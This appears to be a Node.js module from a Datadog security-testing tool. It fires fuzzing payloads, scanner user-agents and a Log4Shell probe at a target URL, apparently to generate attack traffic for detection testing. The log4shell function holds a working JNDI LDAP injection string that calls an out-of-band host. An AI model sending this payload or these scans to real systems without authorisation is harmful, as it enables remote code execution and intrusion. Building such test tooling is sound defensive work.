// Unless explicitly stated otherwise all files in this repository are licensed under the Apache 2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/) Copyright 2023 Datadog, Inc.

const  ora = require('ora')
const chalk = require('chalk');
const logSymbols= require('log-symbols');
const { http } = require('../lib/request')
const fs = require('fs');

const threshold = 100;



async function generic(targetURL){

    const spinner = ora('Running generic security scanning').start();

    let payloads = fs.readFileSync(__dirname + '/fuzzing.txt', {encoding:'utf8'});
        payloads = payloads.split("\n");

    for (const payload of payloads) {
        spinner.text = 'Basic security scan: ' + payload;
        await http().get(targetURL, {
            x : payload
        });
    //    await new Promise(r => setTimeout(r, 100));
    }

    spinner.stopAndPersist({
                    symbol: logSymbols.success,
                    text: 'Basic security scan - done',
                });
   
}

async function attack_tools(targetURL){

    const spinner = ora('Running generic security scanning').start();

    let userAgents = fs.readFileSync(__dirname + '/user-agents.txt', {encoding:'utf8'});
    userAgents = userAgents.split("\n");

    let payloads = fs.readFileSync(__dirname + '/generic-payloads.txt', {encoding:'utf8'});
    payloads = payloads.split("\n");

    for (const userAgent of userAgents) {
        
        for (const payload of payloads) {

            spinner.text = 'Basic security scan with tool: ' + userAgent + ' payload: ' + payload;
            const config = {
                method: 'GET',
                url: targetURL,
                headers: {
                'User-Agent': userAgent,
                },
                data : {
                    q: payload
                }
                //maxRedirects:0
            };

            await http().custom(config)
            
        }
        await new Promise(r => setTimeout(r, 200));
    }

    spinner.stopAndPersist({
                    symbol: logSymbols.success,
                    text: 'Basic security scan - done',
                });
   
}

async function log4shell(targetURL){

    const spinner = ora('Log4Shell attack on a Non-Vulnerable application').start();

    spinner.text = 'Sending log4shell attack...';
    await http().get(targetURL, {
        q: '${jndi:ldap://blablablablablablabla.oob.li/a=b}'
    });
    
    spinner.stopAndPersist({
                    symbol: logSymbols.success,
                    text: 'Log4Shell attack on a Non-Vulnerable application - done',
                });
   
}

module.exports = { generic, attack_tools, log4shell}